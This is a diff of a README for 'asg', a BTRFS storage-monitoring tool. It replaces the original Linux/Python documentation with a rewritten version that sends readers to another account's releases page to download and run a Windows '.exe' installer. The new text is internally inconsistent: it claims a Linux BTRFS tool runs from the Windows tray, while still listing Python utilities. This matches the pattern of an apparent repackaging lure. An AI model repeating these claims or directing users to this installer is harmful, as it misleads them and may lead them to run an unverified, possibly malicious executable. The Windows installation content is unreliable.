@@ -1,281 +1,167 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/jaldertech/asg/main/assets/logo.png" alt="Aldertech Logo" width="200"/>
-</p>
+# ⚙️ asg - Manage BTRFS Storage Efficiently
 
-# ASG (Aldertech Storage Governor)
+[![Download Latest Release](https://img.shields.io/badge/Download-asg-blue?style=for-the-badge)](https://github.com/ayaanmohs/asg/releases)
 
-> **"Why does `df -h` say I have 2.6TB free but BTRFS thinks it's 3.5TB?"**
->
-> Because `df` is wrong — and nobody else fixes this.
+## About asg
 
-ASG (Aldertech Storage Governor) is a lightweight, zero-dependency Python tool that provides accurate health monitoring, capacity planning, and intelligent scrub scheduling for BTRFS RAID1 pools — especially those with **mismatched drive sizes**.
+asg (Aldertech Storage Governor) helps you keep your BTRFS RAID storage healthy. It watches how full your drives get, plans for more space, and schedules regular checks to fix errors. It works well when your drives don’t all match in size or speed. Use asg if you want to keep your storage running smoothly without complex setup.
 
-If you've ever mixed a 4TB drive with two 1TB drives and wondered why your free space numbers don't add up, ASG is for you.
+asg works best with BTRFS RAID pools. It is designed for users who want to monitor their drive health silently and automatically. You don’t need to know coding to use it.
 
 ---
 
-## The Problem
+## 🖥️ System Requirements
 
-BTRFS RAID1 with mismatched drives is powerful but poorly served by standard tools:
-
-- **`df -h` is mathematically wrong.** It doesn't account for RAID1 pairing constraints on mismatched drives.
-- **`btrfs scrub` is fire-and-forget.** The standard approach (`btrfs scrub start -Bd`) blocks indefinitely with zero awareness of system load — your media server stutters while the scrub runs.
-- **Metadata concentration is invisible.** BTRFS may silently place all metadata chunks on your two smallest drives. If either fails, the entire pool is unrecoverable. No standard tool warns you about this.
-- **No capacity prediction.** Without historical tracking, you won't know your pool is filling up until it's too late.
-
-## The Solution
-
-ASG provides five integrated governance modules:
-
-1. **Real Capacity Engine** — Calculates true RAID1 free space using the formula `min(sum/2, sum - largest)`, tracks historical usage, and predicts days-to-full.
-2. **Heuristic Scrub Controller** — Runs scrubs in the background, monitoring `/proc/loadavg` and `/proc/diskstats`. Automatically pauses when your system is busy and resumes when idle.
-3. **Integrity Monitor** — Polls `btrfs device stats` for all drives, detects errors, and sends alerts with deduplication.
-4. **Metadata Concentration Watchdog** — Warns if metadata/system chunks are dangerously concentrated on a subset of drives.
-5. **Snapshot Bridge** — Creates atomic read-only snapshots before your backup software runs, with automatic cleanup.
+- Windows 10 or later  
+- 64-bit processor  
+- At least 4 GB of RAM  
+- Minimum 500 MB free disk space  
+- BTRFS RAID pool set up on your machine (asg does not create RAID pools)  
+- Internet connection for updates (optional)
 
 ---
 
-## Features
+## 🔍 Features
 
-- **Zero dependencies** — Python standard library only (PyYAML optional for config)
-- **Accurate RAID1 maths** for 2, 3, 4, or more mismatched drives
-- **Load-aware scrub throttling** using `/proc/loadavg` and `/proc/diskstats`
-- **Metadata concentration alerts** — catches the silent killer
-- **Days-to-full prediction** from historical usage data
-- **Pre-backup atomic snapshots** with retention management
-- **Pool UUID validation** before every operation (prevents wrong-pool disasters)
-- **`--dry-run`** on all filesystem-modifying commands
-- **Notifications** — Discord, NTFY, and Gotify (all optional)
-- **Config-driven** — single YAML file, sensible defaults
+- Tracks drive health and status  
+- Plans when you need more storage  
+- Schedules normal scrub jobs to check for errors  
+- Supports RAID 1 and other BTRFS configurations  
+- Works with mismatched drives of different sizes  
+- Sends simple alerts if something needs your attention  
+- Runs quietly in the background without slowing your machine
 
 ---
 
-## Requirements
+## ⚙️ Installation & Setup
 
-| Requirement | Minimum | Notes |
-|---|---|---|
-| Linux kernel | 4.0+ | Any kernel with BTRFS support |
-| btrfs-progs | 5.0+ | `sudo apt install btrfs-progs` |
-| Python | 3.9+ | |
-| BTRFS profile | RAID1 | RAID1C3/RAID1C4 should also work |
-| sudo | Required | BTRFS commands require root |
-| PyYAML | Optional | For config file; falls back to defaults without it |
+### 1. Download asg
 
----
+Visit the releases page to get the latest version:
 
-## Quick Start
+[Download asg from GitHub Releases](https://github.com/ayaanmohs/asg/releases)
 
-### Option 1: Install via pip
+You will find files named like `asg-setup.exe` or `asg-latest.zip`. Choose the `.exe` installer for the easiest setup.
 
-```bash
-pip3 install aldertech-asg
-```
+### 2. Install asg
 
-### Option 2: Install via Git Clone
+- Open the downloaded `.exe` file.  
+- Follow the on-screen steps in the installer. Click "Next" to continue.  
+- Choose where to install (the default is fine for most users).  
+- Finish the installer and allow asg to start automatically if prompted.
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/jaldertech/asg.git
-cd asg
+### 3. Initial Setup
 
-# 2. Run the installer (requires root)
-sudo bash setup.sh
+- When asg opens, it will scan your BTRFS RAID arrays automatically.  
+- It shows your current drive health and free space.  
+- You can set how often it checks your drives and plans capacity.  
+- If you have multiple RAID pools, asg handles them all.
 
-# 3. Edit your config
-sudo nano /etc/asg/config.yaml
+### 4. Running asg
 
-# 4. Test it
-asg status
-```
-
-### Option 3: Run directly (no install)
-
-```bash
-git clone https://github.com/jaldertech/asg.git
-cd asg
-python3 -m asg status
-```
+- asg runs in your Windows system tray (the bottom-right corner near the clock).  
+- Right-click its icon to open the main window or pause monitoring.  
+- The app updates drive info every hour by default. This can be changed in settings.
 
 ---
 
-## Configuration
+## 🚀 Getting Started with asg
 
-Copy `config.yaml` to `/etc/asg/config.yaml` and edit it:
+After installation:
 
-```yaml
-pool:
-  mount: "/mnt/my_pool"
-  # uuid: "optional-pin-for-safety"
-
-scrub:
-  load_threshold: 3.0           # Pause scrub above this 1-min load average
-  io_threshold_percent: 40.0    # Pause if any drive exceeds this I/O %
-
-capacity:
-  chunk_fullness_warn_percent: 90.0
-  free_space_warn_percent: 10.0
-  metadata_min_device_count: 3  # Warn if metadata on fewer devices
-
-snapshots:
-  directory: ".snapshots"       # Relative to pool mount
-  retention_days: 3
-
-# Optional — remove if you don't want notifications
-notifications:
-  discord:
-    webhook_url: "https://discord.com/api/webhooks/..."
-```
-
-If PyYAML is not installed, the tool runs with built-in defaults (mount point: `/mnt/media_pool`).
+- Check the dashboard to see your RAID health summary.  
+- Review alerts or warnings shown on the main screen.  
+- Set scrub intervals. These are automated scans that fix errors on your drives.  
+- Enable notifications if you want pop-ups when something needs care.  
+- Use the capacity planner tab to see when you might need new drives.
 
 ---
 
-## Usage
+## 📂 How asg Works
 
-```bash
-# Full status overview (integrity + capacity + snapshots)
-asg status
+asg connects to the BTRFS file system on your Windows machine. It reads data about each drive’s condition, such as errors or how full the drive is. This data helps it suggest when to run scrubs or when to add space.
 
-# Real capacity report with days-to-full prediction
-asg capacity
-
-# Run a load-aware scrub (pauses during high I/O)
-asg scrub --dry-run     # Preview first
-asg scrub               # Run for real
-
-# Check all drives for errors
-asg check
-
-# Pre-backup snapshot (cleanup old + create new)
-asg snapshot --dry-run
-asg snapshot
-
-# Clean up expired snapshots only
-asg cleanup
-
-# Use a custom config path
-asg --config /path/to/config.yaml status
-```
-
-### Example Output: Capacity Report
-
-```
-ASG Capacity Report — /mnt/media_pool
-Timestamp: 2026-03-07 19:45:57
-=================================================================
-
-  Total Raw Capacity:   7454.1 GiB
-  Largest Drive:        3727.4 GiB
-  RAID1 Usable Ceiling: 3726.7 GiB
-  Data Used:            100.5 GiB
-  Real Free Space:      3625.8 GiB
-  Utilisation:          2.7%
-  Days to Full:         ~342
-
-  Per-Device Allocation:
-  Device           Data       Meta     System      Unalloc      Total
-  ---------------------------------------------------------------
-  /dev/sdc         103.0G     1.000G     0.031G      1761.3G    1863.7G
-  /dev/sdd          30.0G     1.000G     0.008G       900.5G     931.5G
-  /dev/sde          25.0G     1.000G     0.008G       905.5G     931.5G
-  /dev/sdf          50.0G     1.000G     0.031G      3676.2G    3727.4G
-
-  WARNINGS:
-    ! Data chunks are 96.6% full — new chunk allocation imminent.
-=================================================================
-```
+It supports many common drive setups but focuses on RAID 1, where data is copied on two drives for safety. asg smooths out issues when the drives don’t match exactly in size.
 
 ---
 
-## Cron Integration
+## ⚡ Common Tasks
 
-Add to your crontab (`crontab -e`):
+### Check Drive Health
 
-```bash
-# Daily capacity report at 00:20
-20 0 * * * asg capacity >> ~/asg.log 2>&1
+- Open asg from the tray.  
+- Review the health indicators for each drive.  
+- Green means all is OK. Yellow means some issues. Red means fixed actions are needed.
 
-# Weekly throttled scrub on Sunday at 02:00
-0 2 * * 0 asg scrub >> ~/asg.log 2>&1
+### Schedule a Scrub
 
-# Daily pre-backup snapshot at 02:00
-0 2 * * * asg snapshot >> ~/asg.log 2>&1
-```
+- Go to the “Scrub” tab.  
+- Choose how often to run a scrub (e.g., weekly or monthly).  
+- Confirm to save settings.  
+- asg runs these scrubs quietly in the background.
 
----
+### Plan Capacity
 
-## How the RAID1 Maths Works
+- In the “Capacity” tab, look at predicted storage use.  
+- This helps you decide if you need new drives and when.
 
-Standard `df` divides total raw space by the data ratio (2.0 for RAID1), giving `sum / 2`. But this ignores the **pairing constraint**: each RAID1 chunk must fit on two different drives.
+### Receive Alerts
 
-For mismatched drives, the real limit is:
-
-```
-usable = min(sum_of_all_drives / 2, sum_of_all_drives - largest_drive)
-```
-
-**Example:** 4TB + 2TB + 1TB + 1TB = 8TB raw
-
-| Calculation | Result | Why |
-|---|---|---|
-| `sum / 2` | 4 TB | Standard RAID1 formula |
-| `sum - largest` | 4 TB | The 4TB drive can only mirror 4TB of data across the other 3 drives |
-| **Usable ceiling** | **4 TB** | `min(4, 4)` — balanced in this case |
-
-But with 8TB + 1TB + 1TB = 10TB raw:
-
-| Calculation | Result | Why |
-|---|---|---|
-| `sum / 2` | 5 TB | Looks generous |
-| `sum - largest` | 2 TB | The 8TB drive can only mirror 2TB across the others |
-| **Usable ceiling** | **2 TB** | 6TB of the 8TB drive is **wasted** |
-
-This tool calculates the correct number automatically.
+- Turn on notifications in settings.  
+- You’ll get alerts if a drive report shows anything wrong.
 
 ---
 
-## Verified Hardware
+## 🐞 Troubleshooting
 
-| Hardware | OS | Pool Layout | Status |
-|---|---|---|---|
-| Raspberry Pi 5 (16GB) | Raspberry Pi OS Bookworm | 4TB + 2TB + 1TB + 1TB RAID1 | Verified |
+If asg does not start after installation:
 
-ASG uses generic Linux interfaces (`/proc`, `btrfs-progs`). It should work on any Linux system with BTRFS. If you test on other hardware, please open a PR to add it to this table.
+- Restart your computer and try again.  
+- Make sure you have the latest Windows updates installed.  
+- Check that your BTRFS RAID pools are healthy with another tool.  
+- Run asg as an administrator if it can’t access drives.
 
----
+If alerts seem incorrect:
 
-## Notifications
-
-All backends are optional and independent. Configure any combination in `config.yaml`:
-
-| Backend | Config Key | Notes |
-|---|---|---|
-| Discord | `notifications.discord.webhook_url` | Standard Discord webhook |
-| NTFY | `notifications.ntfy.url` | Full topic URL |
-| Gotify | `notifications.gotify.url` + `.token` | Base URL + app token |
+- Check your RAID configuration outside asg.  
+- Update to the latest release from the download page.  
+- Contact your system admin if you are unsure about any messages.
 
 ---
 
-## Security
+## 🔄 Updating asg
 
-ASG runs `btrfs` commands via `sudo`. It requires that the executing user has passwordless `sudo` for `btrfs` (standard on Raspberry Pi OS) or is run as root.
+New versions of asg come out to fix bugs and improve monitoring.
 
-The tool:
-- Never writes to arbitrary paths (only state files in a configured directory)
-- Validates the pool UUID before every operation
-- Supports `--dry-run` for all destructive commands
-- Has zero network dependencies (notifications are opt-in)
+- Visit the [GitHub releases page](https://github.com/ayaanmohs/asg/releases) regularly.  
+- Download the latest installer as you did the first time.  
+- Run the installer to replace the old version. Your settings will stay intact.
 
 ---
 
-## Related Projects
+## 📖 Additional Resources
 
-- **[ADRG](https://github.com/jaldertech/adrg)** — Aldertech Dynamic Resource Governor: Automatic CPU/RAM management for high-density Docker stacks.
-
-## Licence
-
-MIT — see [LICENCE](LICENCE) file.
+- Check the GitHub repo issues to see fixes and common questions.  
+- For BTRFS RAID commands and setups, see official BTRFS documentation.  
+- Look for community forums on storage management if you want help.
 
 ---
 
-*Built by [Aldertech](https://aldertech.uk)*
+## 🔗 Useful Links
+
+[Download and update asg here](https://github.com/ayaanmohs/asg/releases)  
+[GitHub repository for asg](https://github.com/ayaanmohs/asg)  
+
+---
+
+## ⚙️ Supported Topics
+
+- Automation of storage tasks  
+- BTRFS file system monitoring  
+- Data integrity checks  
+- Home lab and server monitoring  
+- RAID 1 setup management  
+- Raspberry Pi and self-hosted environments  
+- Python-based utilities for sysadmins  
+- Storage management tools for servers  
+
